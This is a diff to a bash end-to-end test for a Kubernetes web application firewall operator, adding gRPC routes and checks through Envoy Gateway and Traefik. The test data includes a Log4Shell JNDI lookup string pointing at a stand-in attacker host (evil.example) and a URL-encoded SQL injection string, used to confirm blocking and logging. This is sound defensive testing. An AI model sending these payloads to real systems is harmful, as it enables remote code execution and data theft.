@@ -8,7 +8,8 @@
 # naming the user's EnvoyProxy, one naming none). The engine joins the
 # Envoy pods, attacks are blocked through both proxies, a body attack is
 # held back with its headers, one followed by HTTP/2 trailers is inspected
-# too, and unprotecting or uninstalling leaves the
+# too, gRPC calls pass in block mode but not one with an attack in its
+# metadata (#284), and unprotecting or uninstalling leaves the
 # user's objects as they were. Needs the operator installed (make
 # kind-operator); ends with helm uninstall. KEEP=1 leaves the test's objects.
 set -euo pipefail
@@ -140,6 +141,31 @@ spec:
   selector: {app: eg-e2e}
   ports: [{name: http, port: 8080}]
 ---
+# A gRPC service: grpc.health.v1.Health, over h2c.
+apiVersion: apps/v1
+kind: Deployment
+metadata: {name: grpc, namespace: $NS}
+spec:
+  selector: {matchLabels: {app: eg-e2e-grpc}}
+  template:
+    metadata: {labels: {app: eg-e2e-grpc}}
+    spec:
+      containers:
+        - name: grpc
+          image: registry.k8s.io/e2e-test-images/agnhost:2.53
+          args: ["grpc-health-checking", "--port", "5000"]
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: grpc
+  namespace: $NS
+  # Traefik's backend protocol; Envoy Gateway's is the appProtocol.
+  annotations: {traefik.ingress.kubernetes.io/service.serversscheme: h2c}
+spec:
+  selector: {app: eg-e2e-grpc}
+  ports: [{name: grpc, port: 5000, appProtocol: kubernetes.io/h2c}]
+---
 apiVersion: gateway.networking.k8s.io/v1
 kind: GatewayClass
 metadata: {name: inkwall-e2e}
@@ -182,6 +208,9 @@ spec:
   rules:
     - name: web
       backendRefs: [{name: app, port: 8080}]
+    - name: grpc
+      matches: [{path: {type: PathPrefix, value: /grpc.health.v1.Health/}}]
+      backendRefs: [{name: grpc, port: 5000}]
 ---
 apiVersion: networking.k8s.io/v1
 kind: Ingress
@@ -195,8 +224,12 @@ spec:
           - path: /
             pathType: Prefix
             backend: {service: {name: app, port: {number: 8080}}}
+          - path: /grpc.health.v1.Health/
+            pathType: Prefix
+            backend: {service: {name: grpc, port: {number: 5000}}}
 YAML
 "${KUBECTL[@]}" -n "$NS" rollout status deployment/app --timeout=120s >/dev/null
+"${KUBECTL[@]}" -n "$NS" rollout status deployment/grpc --timeout=120s >/dev/null
 
 # What the user wrote, to compare with after the operator is gone.
 user_objects() {
@@ -310,6 +343,20 @@ h2_are() {
     [[ $("$work/h2trailers" -host "$HOST" "http://127.0.0.1:$port$path" "$body") == "$want" ]] || return 1
   done
 }
+# grpc_are CODE [KEY=VALUE...]: a gRPC call (grpc.health.v1.Health/Check)
+# with that metadata ends with that status code, through both Gateways and
+# Traefik. A denial is an HTTP 403, which gRPC clients read as
+# PermissionDenied.
+grpc_are() {
+  local want=$1 md=() port
+  shift
+  for kv in "$@"; do md+=(-metadata "$kv"); done
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT" "$TRAEFIK_PORT"; do
+    [[ $("$work/grpchealth" -authority "$HOST" "${md[@]}" "127.0.0.1:$port") == "$want" ]] || return 1
+  done
+}
+# Log4Shell (944150), quoted: not a shell expansion.
+GRPC_ATTACK='x-api-key=${jndi:ldap://evil.example/a}'
 no_limits() { ! "${KUBECTL[@]}" -n "$NS" get clienttrafficpolicy inkwall-waf-custom inkwall-waf-plain -o name 2>/dev/null | grep . >/dev/null; }
 # The operator's buffer limit, in force on both Gateways.
 limits_accepted() {
@@ -325,12 +372,15 @@ no_wiring() {
     ! "${KUBECTL[@]}" -n "$NS" get envoyproxy inkwall-waf-plain >/dev/null 2>&1
 }
 
+go build -o "$work/h2trailers" ./hack/h2trailers
+go build -o "$work/grpchealth" ./hack/grpchealth
 for gw in custom plain; do
   eventually "Envoy Gateway runs Gateway $gw" envoy_pods "$gw"
 done
 forward_all
 eventually "the Gateways and Traefik serve the app" all_are 200 /
 check "no policy yet: the attack passes" all_are 200 "$SQLI"
+eventually "the Gateways and Traefik serve the gRPC service" grpc_are OK
 
 echo "== one policy, two proxies"
 policy
@@ -377,9 +427,12 @@ check "a body attack on a marked path is blocked" envoy_are 403 "$mark" --data-u
 check "and never reached the app" never_reached_app "$mark"
 # Trailers: Envoy sends the body without end_of_stream, as one it cut at
 # its buffer limit; the engine still inspects it (#235).
-go build -o "$work/h2trailers" ./hack/h2trailers
 check "an attack in a body with trailers (HTTP/2) is blocked" h2_are 403 / "q=1%27%20OR%20%271%27%3D%271"
 check "a benign body with trailers (HTTP/2) passes" h2_are 200 / "q=hello"
+# gRPC (#284): CRS denied every call before v0.3.1 (920420, and its rules
+# on the binary body).
+check "a gRPC call passes" grpc_are OK
+check "a gRPC call with an attack in its metadata is denied" grpc_are PermissionDenied "$GRPC_ATTACK"
 
 echo "== detect mode"
 policy Detect
@@ -396,6 +449,8 @@ eventually "the engines log the streamed body's attack" logged "$body_path"
 h2_path=/detect-h2-$RANDOM$RANDOM
 check "a body attack with trailers (HTTP/2) passes" h2_are 200 "$h2_path" "q=1%27%20OR%20%271%27%3D%271"
 eventually "the engines log its rule, not an oversized body" logged_rule "$h2_path"
+check "a gRPC call passes" grpc_are OK
+check "a gRPC call with an attack in its metadata passes" grpc_are OK "$GRPC_ATTACK"
 
 echo "== unprotected"
 "${KUBECTL[@]}" -n "$NS" delete wafpolicy shared --timeout=60s >/dev/null
